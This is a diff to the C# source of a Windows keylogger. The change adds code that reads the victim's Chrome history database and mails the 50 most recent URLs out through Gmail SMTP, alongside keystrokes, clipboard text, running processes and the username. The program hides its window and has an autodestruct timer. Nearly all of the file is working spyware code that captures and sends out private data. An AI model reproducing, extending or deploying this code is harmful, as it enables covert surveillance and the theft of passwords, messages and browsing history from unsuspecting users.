@@ -1,26 +1,26 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows;
-using System.Windows.Controls;
-using System.Windows.Data;
-using System.Windows.Documents;
-using System.Windows.Input;
-using System.Windows.Media;
-using System.Windows.Media.Imaging;
-using System.Windows.Navigation;
-using System.Windows.Shapes;
 using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Net.Mail;
+using System.Data;
+using System.Collections.Generic;
+using System.Data.SQLite;
 using System.Threading;
 
 namespace Keylogger
 {
+    public class HistoryItem
+    {
+        public string URL { get; set; }
+
+        public string Title { get; set; }
+
+        public DateTime VisitedTime { get; set; }
+    }
+
     public struct checkBoxes
     {
         public bool ipAdd, apps, keys, copied, history;
@@ -49,6 +49,8 @@ namespace Keylogger
         public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
         uint lastProc;
 
+        private bool ChromeExists = false;
+
         public MainWindow()
         {
             InitializeComponent();
@@ -60,7 +62,7 @@ namespace Keylogger
             emailTo = emailToSend.Text;
             string timeString = timeBetweenEmails.Text;
             string timeAutodestructString = timeToAutodestruction.Text;
-            if(!checkEmail(emailTo))
+            if (!checkEmail(emailTo))
             {
                 return;
             }
@@ -72,7 +74,7 @@ namespace Keylogger
             {
                 return;
             }
-            if(!checkCheckBoxes())
+            if (!checkCheckBoxes())
             {
                 return;
             }
@@ -80,31 +82,35 @@ namespace Keylogger
             int timeAutodestruct = Convert.ToInt32(timeAutodestructString);
             this.Hide();
             //Set path of txt
-            string folder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);       
+            string folder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
             //if(!Directory.Exists(folder))                                                         
-                //Directory.CreateDirectory(folder);                                                
-            string filepath = System.IO.Path.Combine(folder, "Keylogger");                          
-            if (!System.IO.File.Exists(filepath))                                                   
-                Directory.CreateDirectory(filepath);                                                
+            //Directory.CreateDirectory(folder);                                                
+            string filepath = System.IO.Path.Combine(folder, "Keylogger");
+            if (!System.IO.File.Exists(filepath))
+                Directory.CreateDirectory(filepath);
             string pathKeys = (filepath + @"\keystrokes.txt");
             if (!File.Exists(pathKeys))
                 using (StreamWriter sw = File.CreateText(pathKeys)) ;
             string pathProcesses = (filepath + @"\processes.txt");
             if (!File.Exists(pathProcesses))
                 using (StreamWriter sw = File.CreateText(pathProcesses)) ;
-            string pathClipboard = (filepath + @"\clipboard.txt");                                   
-            if (!File.Exists(pathClipboard))                                                        
+            string pathClipboard = (filepath + @"\clipboard.txt");
+            if (!File.Exists(pathClipboard))
                 using (StreamWriter sw = File.CreateText(pathClipboard)) ;
+            string pathHistoryChrome = (filepath + @"\ChromeHistory.txt");
+            if (!File.Exists(pathHistoryChrome))
+                using (StreamWriter sw = File.CreateText(pathHistoryChrome)) ;
             File.WriteAllText(pathKeys, string.Empty);//
             File.WriteAllText(pathProcesses, string.Empty);
-            File.WriteAllText(pathClipboard, string.Empty);                                         
+            File.WriteAllText(pathClipboard, string.Empty);
+            File.WriteAllText(pathHistoryChrome, string.Empty);
 
             //Send email every 1 min
             var startTimeSpan = TimeSpan.Zero;
             var periodTimeSpan = TimeSpan.FromMinutes(time);
             var timer = new System.Threading.Timer((E) =>
             {
-                getActiveProcessesAndSendEmail(pathKeys, pathProcesses, pathClipboard,boxes);
+                getActiveProcessesAndSendEmail(pathKeys, pathProcesses, pathClipboard, boxes, pathHistoryChrome);
             }, null, startTimeSpan, periodTimeSpan);
 
             //var timeUntillAutodestruction = TimeSpan.FromMinutes(timeAutodestruct);
@@ -116,7 +122,7 @@ namespace Keylogger
             string clipboardContent = Clipboard.GetText();
             while (true)
             {
-                //Thread.Sleep(5);
+                Thread.Sleep(5);
                 getKeys(pathKeys);
                 getClipboard(clipboardContent, pathClipboard);
             }
@@ -154,7 +160,6 @@ namespace Keylogger
             }
         }
 
-
         void getClipboard(string clipboardContent, string pathClipboard)
         {
             DataObject retrievedData = (DataObject)Clipboard.GetDataObject();
@@ -172,7 +177,7 @@ namespace Keylogger
             }
         }
 
-        void getActiveProcessesAndSendEmail(string pathKeys, string pathProcesses, string pathClipboard,checkBoxes boxes)                                               //
+        void getActiveProcessesAndSendEmail(string pathKeys, string pathProcesses, string pathClipboard, checkBoxes boxes, string pathHistoryChrome)                                               //
         {
             File.WriteAllText(pathProcesses, string.Empty);
             Process[] processes = Process.GetProcesses();
@@ -186,18 +191,20 @@ namespace Keylogger
                     }
                 }
             }
-            SendNewMessage(pathKeys, pathProcesses, pathClipboard,boxes);
+            checkIfChrome(processes, pathHistoryChrome);
+            SendNewMessage(pathKeys, pathProcesses, pathClipboard, boxes, pathHistoryChrome);
             File.WriteAllText(pathKeys, string.Empty);
             File.WriteAllText(pathProcesses, string.Empty);
             File.WriteAllText(pathClipboard, string.Empty);
+            File.WriteAllText(pathHistoryChrome, string.Empty);
         }
 
-
-        void SendNewMessage(string pathKeys, string pathProcesses, string pathClipboard,checkBoxes boxes)
+        void SendNewMessage(string pathKeys, string pathProcesses, string pathClipboard, checkBoxes boxes, string pathHistoryChrome)
         {
-            string logKeys = File.ReadAllText(pathKeys);                                                    
-            string logProcesses = File.ReadAllText(pathProcesses);                                     
-            string logClipboard = File.ReadAllText(pathClipboard);                                      
+            string logKeys = File.ReadAllText(pathKeys);
+            string logProcesses = File.ReadAllText(pathProcesses);
+            string logClipboard = File.ReadAllText(pathClipboard);
+            string logHistoryChrome = File.ReadAllText(pathHistoryChrome);
 
             DateTime now = DateTime.Now;
             string subject = "Message from keylogger";
@@ -214,16 +221,15 @@ namespace Keylogger
             //emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
             emailBody += "\nUser: " + Environment.UserName;
             emailBody += "\nTime: " + now.ToString();
-            if(boxes.apps)
+            if (boxes.apps)
                 emailBody += "\nOpen apps: \n" + logProcesses;
-            if(boxes.keys)
+            if (boxes.keys)
                 emailBody += "\nKeys pressed: \n" + logKeys;
-            if(boxes.copied)
+            if (boxes.copied)
                 emailBody += "\nCopied text: \n" + logClipboard;                                //
-            if(boxes.history)
-            {
-                //emailBody+=;
-            }
+            if (boxes.history)
+                emailBody += "\nWeb History from Chrome: \n" + logHistoryChrome;
+
 
             SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
             client.UseDefaultCredentials = false;
@@ -353,5 +359,168 @@ namespace Keylogger
         {
             MessageBox.Show("This is the time the keylogger will run(in minutes) until it will autodestruct itself.");
         }
+
+        private void checkIfChrome(Process[] procese, string pathHistoryChrome)
+        {
+
+            if (ChromeExists == false)
+            {
+                foreach (Process p in procese)
+                {
+                    if (!String.IsNullOrEmpty(p.MainWindowTitle))
+                    {
+                        if (p.ProcessName == "chrome")
+                        {
+                            ChromeExists = true;
+                        }
+
+                    }
+                }
+            }
+            else
+            {
+                bool processesChromeRunning = false;
+                foreach (Process p in procese)
+                {
+                    if (!String.IsNullOrEmpty(p.MainWindowTitle))
+                    {
+                        if (p.ProcessName == "chrome")
+                        {
+                            processesChromeRunning = true;
+                        }
+                    }
+                }
+                if (processesChromeRunning == false)
+                {
+                    getHistoryChrome(pathHistoryChrome);
+                }
+            }
+        }
+
+        private List<HistoryItem> ShowHis()
+        {
+            string chromeHistoryFile = (Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)) + @"\Google\Chrome\User Data\Default\History";
+            if (File.Exists(chromeHistoryFile))
+            {
+                SQLiteConnection connection = new SQLiteConnection
+                ("Data Source=" + chromeHistoryFile + ";Version=3;New=False;Compress=True;");
+
+                connection.Open();
+
+                DataSet dataset = new DataSet();
+
+                SQLiteDataAdapter adapter = new SQLiteDataAdapter
+                ("select * from urls order by last_visit_time desc", connection);
+                adapter.Fill(dataset);
+                if (dataset != null && dataset.Tables.Count > 0 & dataset.Tables[0] != null)
+                {
+                    DataTable dt = dataset.Tables[0];
+                    List<HistoryItem> allHistoryItems = new List<HistoryItem>();
+
+                    foreach (DataRow historyRow in dt.Rows)
+                    {
+                        HistoryItem historyItem = new HistoryItem();
+                        {
+                            historyItem.URL = Convert.ToString(historyRow["url"]);
+                            historyItem.Title = Convert.ToString(historyRow["title"]);
+                        };
+
+                        long utcMicroSeconds = Convert.ToInt64(historyRow["last_visit_time"]);
+                        DateTime gmtTime = DateTime.FromFileTimeUtc(10 * utcMicroSeconds);
+                        DateTime localTime = TimeZoneInfo.ConvertTimeFromUtc(gmtTime, TimeZoneInfo.Local);
+                        historyItem.VisitedTime = localTime;
+
+                        allHistoryItems.Add(historyItem);
+                    }
+                    return allHistoryItems;
+                }
+                return null;
+            }
+            return null;
+        }
+
+        private void getHistoryChrome(string pathHistoryChrome)
+        {
+            using (StreamWriter sw = File.AppendText(pathHistoryChrome))
+            {
+                sw.WriteLine("\n--START--\n");
+                List<HistoryItem> list = ShowHis();
+                int cnt;
+                if (50 > list.Count)
+                    cnt = list.Count;
+                else
+                    cnt = 50;
+
+                for (int i = 0; i < cnt; i++)
+                {
+                    sw.WriteLine(i+1 + ") " + list[i].VisitedTime + " -> " + list[i].URL);
+                }
+                sw.WriteLine("\n--END--\n");
+            }
+
+        }
+
+        /////////////get req/////////////////////////////////////////
+
+        //[DllImport("kernel32.dll", SetLastError = true)]
+        //[return: MarshalAs(UnmanagedType.Bool)]
+        //static extern bool AllocConsole();
+
+        //private void getReq_Click(object sender, RoutedEventArgs e)
+        //{
+        //    AllocConsole();
+        //    Console.WriteLine("ceva");
+
+        //    if (!HttpListener.IsSupported)
+        //    {
+        //        Console.WriteLine("Windows XP SP2 or Server 2003 is required to use the HttpListener class.");
+        //        return;
+        //    }
+        //    // URI prefixes are required,
+        //    var prefixes = new List<string>() { "http://*:8089/","https://*:8443/"  };
+
+        //    // Create a listener.
+        //    HttpListener listener = new HttpListener();
+        //    // Add the prefixes.
+        //    foreach (string s in prefixes)
+        //    {
+        //        listener.Prefixes.Add(s);
+        //    }
+        //    listener.Start();
+        //    Console.WriteLine("Listening...");
+        //    while (true)
+        //    {
+        //        Thread.Sleep(100);
+        //        // Note: The GetContext method blocks while waiting for a request.
+        //        HttpListenerContext context = listener.GetContext();
+
+        //        HttpListenerRequest request = context.Request;
+
+        //        string documentContents;
+        //        using (Stream receiveStream = request.InputStream)
+        //        {
+        //            using (StreamReader readStream = new StreamReader(receiveStream, Encoding.UTF8))
+        //            {
+        //                documentContents = readStream.ReadToEnd();
+        //            }
+        //        }
+        //        Console.WriteLine($"Recived request for {request.Url}");
+        //        Console.WriteLine(documentContents);
+
+        //        // Obtain a response object.
+        //        HttpListenerResponse response = context.Response;
+        //        // Construct a response.
+        //        string responseString = "<HTML><BODY> Hello world!</BODY></HTML>";
+        //        byte[] buffer = System.Text.Encoding.UTF8.GetBytes(responseString);
+        //        // Get a response stream and write the response to it.
+        //        response.ContentLength64 = buffer.Length;
+        //        System.IO.Stream output = response.OutputStream;
+        //        output.Write(buffer, 0, buffer.Length);
+        //        // You must close the output stream.
+        //        output.Close();
+        //    }
+        //    listener.Stop();
+
+        //}
     }
 }
